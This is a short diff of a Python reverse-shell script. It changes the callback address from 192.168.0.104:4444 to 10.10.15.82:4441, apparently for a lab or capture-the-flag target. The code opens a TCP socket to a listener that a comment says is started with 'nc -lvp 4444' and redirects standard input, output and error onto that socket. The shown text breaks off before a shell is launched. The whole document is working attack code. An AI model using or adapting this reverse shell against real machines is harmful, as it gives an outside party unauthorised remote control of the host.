@@ -1,7 +1,7 @@
 import socket,subprocess,os
 """nc -lvp 4444 for listening"""
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.0.104",4444))
+s.connect(("10.10.15.82",4441))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
